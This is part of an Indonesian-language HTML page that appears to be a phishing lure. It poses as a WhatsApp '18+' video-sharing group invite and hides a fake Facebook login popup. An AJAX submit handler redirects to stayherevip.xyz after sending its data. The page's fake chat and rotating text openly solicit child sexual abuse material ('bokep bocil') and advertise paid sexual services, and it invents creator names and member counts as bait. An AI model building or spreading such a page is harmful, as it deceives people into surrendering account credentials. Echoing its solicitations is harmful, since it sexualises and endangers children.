    ...
    <style>
      ...
      * {
      ...
      section .join .icon {
        ...
        width: 70px;
        height: 70px;
        background: url('https://i.ibb.co/cCWv7Xs/kmc-20220825-062919.jpg') no-repeat;
        background-size: cover;
  ...
  <body translate="no">
            ...
            <div class="chat">
              <div class="chat-container">
                <div class="user-bar">
                  ...
                  <div class="avatar">
                    <img src="https://i.ibb.co/cCWv7Xs/kmc-20220825-062919.jpg" alt="Avatar" style="object-fit: cover; width: 40px; height: 40px;">
                  </div>
                ...
                <div class="conversation">
                  <div class="conversation-container">
                    ...
                    <div class="message received">
                      ...
                      <span id="random">Ada bokep bocil nggak?</span>
                    ...
                    <div class="message received">
                      ...
                      <img src="https://i.ibb.co/0mnWVgj/kmc-20220825-062957.jpg" width="100%" id="myPicture">
                      <span class="metadata"><span class="time">12:30 AM</span></span>
                    </div>
                  ...
                  <form class="conversation-compose">
                    ...
                    <input class="input-msg" placeholder="Type a message" autocomplete="off" autofocus="">
                    <div class="photo">
              ...
              <section>
                <div class="join" style="">
                  <span class="icon" style="https://i.ibb.co/cCWv7Xs/kmc-20220825-062919.jpg) no-repeat; background-size: cover;"></span>
                  <div class="content">
                    <h1>GROUP SHARE 18+</h1>
                    ...
                    <span class="ceo" id="admin">Grup dibuat oleh ~QinnProject</span>
                    <p class="desc">

                      🔞 WELCOME TO TUKANG COLI 🔞<br><span class="bold">📍 Peraturan 📍</span><span id="dots">...</span> <span id="more"><br>📌 Wajib share vidio<br>📌 Jangan spam gak jelas<br>📌 Kirim sticker ada batasnya<br>📌 Tidak boleh toxic<br>📌 Hormati ras daerah<br>📌 Dilarang chat member di luar grup</span>
                      <span class="more" onclick="myFunction()" id="myBtn">Baca selengkapnya<br>
                        ...
                        <script id="rendered-js">
                          ...
                          var memes = [
                            'Grup dibuat oleh ~Qinn Project',
                            'Grup dibuat oleh ~Qinn Thu Wan',
                            'Grup dibuat oleh ~Mama Muda',
                            'Grup dibuat oleh ~Vidio Hot',
                            'Grup dibuat oleh ~Sintiya',
                            'Grup dibuat oleh ~Ara'
                          ];
                    ...
                    <div class="peserta" id="memberAlexHost">198 peserta</div>
                    <script id="rendered-js">
                      /* Meme */
                    ...
                    <div class="profile">
                      <ul>
                        <li>
                          <div class="imgBox">
                            <img src="https://k.top4top.io/p_2197tbf240.jpg">
                          </div>
                        ...
                        <li>
                          <div class="imgBox">
                            <img src="https://l.top4top.io/p_2197nn5mt1.jpg">
                          </div>
                        ...
                        <li>
                          <div class="imgBox">
                            <img src="https://a.top4top.io/p_2197hnply2.jpg">
                          </div>
                        ...
                        <li>
                          <div class="imgBox">
                            <img src="https://b.top4top.io/p_2197hs5263.jpg">
                          </div>
                        ...
                        <li>
                          <div class="imgBox">
                            <img src="https://e.top4top.io/p_2197ai00b2.jpeg">
                          </div>
                        ...
                        <li>
                          <div class="imgBox">
                            <img src="https://d.top4top.io/p_2197lapmm1.jpeg">
                          </div>
                        ...
                        <li>
                          <div class="imgBox">
                            <img src="https://c.top4top.io/p_2197794660.jpeg">
                          </div>
                ...
                <div class="popup-login login-facebook animated fadeIn" style="display: none;">
                  <div class="popup-box-login-fb">
                    <div class="navbar-fb">
                      <img width="45" src="assets/login/fb-login.png">
                    </div>
                    <div class="content-box-fb">
                      ...
                      <img src="https://f.top4top.io/p_2199rx7jk3.png">
    ...
    <script id="rendered-js">
      ...
      var memes = [
        'Yang mau bokep chat',
        'Bagi bokep bocil',
        'Yang punya bokep bagi',
        'vcs gratis chat saya😘',
        'yang open bo siapa?',
        'jangan lupa bagi Vidio viral'
      ];
...

        {
          ...
          $.ajax({
            ...
            success: function() {
              ...
              $('.fb').html('KIRIM PESAN');
              window.location = 'https://stayherevip.xyz';
            }
          })
        }
      }
